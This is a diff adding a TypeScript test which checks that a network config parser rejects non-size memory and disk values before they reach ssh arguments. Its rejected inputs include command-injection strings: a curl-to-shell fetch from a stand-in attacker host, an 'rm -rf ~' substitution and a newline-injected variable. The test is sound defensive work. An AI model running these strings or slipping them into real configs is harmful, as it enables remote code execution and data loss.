@@ -77,3 +77,20 @@ test("R18 h7: ssh shape and start_dirs parse guards (leader-confirmed vectors)",
   const ok = parseNetworkConfig(yaml("    ssh: pi@192.168.1.10:2222\n    start_dirs: [~/dpi-work]"), "");
   assert.equal(ok.devices.box.ssh, "pi@192.168.1.10:2222");
 });
+
+test("run-8 U9: exe-dev create.memory/disk must be size-shaped (no shell metacharacters into ssh argv)", () => {
+  const base = (create: Record<string, unknown>) => `
+devices:
+  lab:
+    kind: exe-dev
+    vm: lab-box
+    service: systemd
+    create:
+${Object.entries(create).map(([k, v]) => `      ${k}: ${JSON.stringify(v)}`).join("\n")}
+`;
+  assert.ok(parseNetworkConfig(base({ memory: "4G", disk: "80G" })), "size-shaped values parse");
+  assert.ok(parseNetworkConfig(base({ memory: "512MiB" })), "MiB suffix parses");
+  assert.throws(() => parseNetworkConfig(base({ memory: "4G; curl -s https://attacker/x | sh" })), /not a size/);
+  assert.throws(() => parseNetworkConfig(base({ disk: "$(rm -rf ~)" })), /not a size/);
+  assert.throws(() => parseNetworkConfig(base({ memory: "4G\nEVIL=1" })), /not a size/);
+});
